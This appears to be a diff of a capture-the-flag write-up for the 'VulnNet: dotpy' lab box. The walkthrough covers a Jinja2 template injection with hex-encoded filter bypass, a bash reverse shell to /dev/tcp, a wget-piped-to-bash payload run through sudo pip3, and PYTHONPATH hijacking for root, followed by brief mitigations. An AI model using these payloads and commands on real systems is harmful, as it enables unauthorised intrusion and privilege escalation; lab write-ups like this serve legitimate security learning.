@@ -9,7 +9,7 @@ tags: python jinja2 hex ssti
 
 ![Subscribe](/assets/img/vulnnet_dotpy/icon.png){: w="100" .left}
 
-VulnNet: dotpy is a medium difficulty box with a focus on `Python`. Stats off with finding an `SSTI` with URL character black listing and finally into a python package take over. Description
+VulnNet: dotpy is a medium difficulty box with a focus on `Python`. Starts off with finding an `SSTI` with URL filtering which leads into a Python package take over.
 
 
 ## [01] Recon
@@ -17,7 +17,7 @@ VulnNet: dotpy is a medium difficulty box with a focus on `Python`. Stats off wi
 
 ### nmap
 
-Running nmap we find port `8080` open
+Running nmap we find the single port `8080` open.
 
 ```bash
 nmap -sC -sV -oA nmap/scan -p- -v 10.10.132.101
@@ -33,8 +33,8 @@ PORT     STATE SERVICE VERSION
 ---snip---
 ```
 ### website
-Browsing to `http://10.10.132.101:8080` we're greeted with a login / sign up form. Many of the links are Anchors that lead nowhere.
-Since we know the page is loading we can run our `gobuster` scans, and we'll need to add `-b 403` to force the scan.
+Browsing to `http://10.10.132.101:8080` we're greeted with a login and sign up form. Many of the links are anchors that lead nowhere.
+Since we know the page is loading we can run our `gobuster` scans, and we'll need to add `-b 403` to force the scan as the gobuster test scan is blocked by a `403 Unauthenticated` error.
 
 ![Subscribe](/assets/img/vulnnet_dotpy/01.png){: w="300"}
 
@@ -49,7 +49,7 @@ cat main.gobuster
 ```
 
 
-### purse
+### Pursue
 While our scan is running we'll quickly clone the site and check with `pursue`, but there isn't anything of note here.
 
 ```bash
@@ -63,13 +63,13 @@ pursue --endpoints | sort -u
 
 Clicking the `Create New Account` takes us to a `/register` page. We'll use `admin`, `admin@admin.com` and password of `admin`, we're prompted to log in.
 
-Once logged in we see an application dashboard we oddly have a user profile picture and the name of `Staradmin`.  It's possible that using `admin` as our username has caused us to get picked off the top of the database or maybe this is what was meant to happen?
+Once logged in we see an application dashboard, but we oddly have a user profile picture and the name of `Staradmin`.  It's possible that using `admin` as our username has caused us to get picked off the top of the database or maybe this is what was meant to happen?
 
 ![Dashboard](/assets/img/vulnnet_dotpy/02.png){: w="300"}
 
 ### Walking the site
 
-Most of the links are only Anchor tags so are a dead end.  This took me about 2 hours to find a vulnerability, I tried clicking every button and downloading every file and page I could find.
+Again most of the links are only anchor tags. This took me about 2 hours to find a vulnerability, I tried clicking every button, downloading every file and page.
 
 
 ### Server Side Template Injection
@@ -77,7 +77,7 @@ Most of the links are only Anchor tags so are a dead end.  This took me about 2 
 After trying for an `LFI` at `http://10.10.132.101:8080/etc/passwd` you can see that the path `/etc/passwd` is reflected in the page.
 Since our `nmap` banner grab says this site is running `Werkzeug` we can try `Server Side Template Injection (SSTI)`
 
->Misdiagnosing SSTI and XSS is can be easily done, be sure to take the time to validate your findings.
+>Misdiagnosing SSTI, XSS and LFI is can be easily done for beginners, be sure to take the time to validate your findings.
 {: .prompt-tip }
 
 
@@ -115,7 +115,7 @@ My understanding of this code is we're using `requests` object that is available
 {% raw %}{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}{% endraw %}
 ```
 
-Now that we know how to run code raw Python using the `Jinja2` templating engine we have to get past the character black list.
+Now that we know how to run raw Python code using the `Jinja2` templating engine we have to get past the character blacklist.
 Below is the function I wrote to replicate the code given in the research post. We need to prepend `\x` to inform `Jinja2` that this is written in `hex` and not the string `5f`.
 
 ```python
@@ -156,7 +156,7 @@ Running `which%20wget` to check if `wget` is available.  From further testing I'
 ## [04] Attack Chain
 
 Now having all this information available to us, we're able to start formulating our attack chain.
-1. Create Bash reverse shell and saving it as `index.html`.  This allows us to download this file without using a forward slash `/`.
+1. Create Bash reverse shell and save it as `index.html`.  This allows us to download this file without using a forward slash `/`.
 ```bash
 #!/bin/bash
 bash -c 'bash -i >& /dev/tcp/10.8.208.76/4242 0>&1'
@@ -208,6 +208,11 @@ User web may run the following commands on vulnnet-dotpy:
 Because we can run `pip3 install *` as `system-adm` we're able to run any Python file on the system.  The code below will reuse the work we have already completed.
 We'll create a Python script called `setup.py`.  Using `popen` to run `wget` with `-O -` we are able to pipe `index.html` directly into `bash`.
 
+Run an new `netcat` listener to catch our reverse connection.
+```bash
+nc -lnvp 4242
+```
+
 ```bash
 echo 'from os import popen
 popen("wget 10.8.208.76 -O -|bash")' > setup.py
@@ -215,14 +220,16 @@ popen("wget 10.8.208.76 -O -|bash")' > setup.py
 sudo -u system-adm /usr/bin/pip3 install -e .
 ```
 
-## [07] ROOT
-
-Now we can easily read the `user.txt`
+Now we can easily collect our `user.txt` flag.
 
 ```bash
 system-adm@vulnnet-dotpy:~$ cat ~/user.txt
 THM[REDACTED]
 ```
+
+
+## [07] ROOT
+
 Running `sudo -l` again we can run `/opt/backup.py` using Python and also `SETENV`.
 
 ```bash
@@ -232,7 +239,7 @@ User system-adm may run the following commands on vulnnet-dotpy:
     (ALL) SETENV: NOPASSWD: /usr/bin/python3 /opt/backup.py
 ```
 
-We don't have read or write permissions to `/opt`, `/opt/backup.py`, or `/home/manager` but taking a look at the `backup.py` we can see it is importing a few packages.  This means we should be able to import our own package instead of original ones.
+We don't have read or write permissions to `/opt`, `/opt/backup.py`, or `/home/manager` that the script if referencing but taking a look at the top of the `backup.py` we can see it is importing a few packages.  This means we should be able to import our own package instead of original ones.
 
 ```python
 from datetime import datetime
@@ -241,7 +248,7 @@ import zipfile
 ---snip---
 ```
 
-The `SETENV` permission lets us set the `PYTHONPATH` which dictates where one of the directory that Python will use to search for packages.
+The `SETENV` permission lets us set the `PYTHONPATH` which dictates a directory that Python will use to search for packages.
 
 ### zipfile.py
 
@@ -268,7 +275,7 @@ THM[REDACTED]
 In this section we will talk about a few ways to mitigate the risks and vulnerabilities that we found in the system.
 
 ### SSTI
-There was a good attempt to black list several characters from our URL requests. A simple fix here would no to return any dynamic output on the `404` error page.
+There was a good attempt to blacklist several characters from our URL requests. A simple fix here would not to to return any user input on the `404` error page.
 
 ### Backup Script
-Removing `SETENV` permission from `sudo` will mitigate this issue.  Another fix would be to use another backup program and away from `Python`.
+Removing `SETENV` permission from `sudo` will mitigate this issue.  Another fix would be to use another backup program instead of a custom Python script.
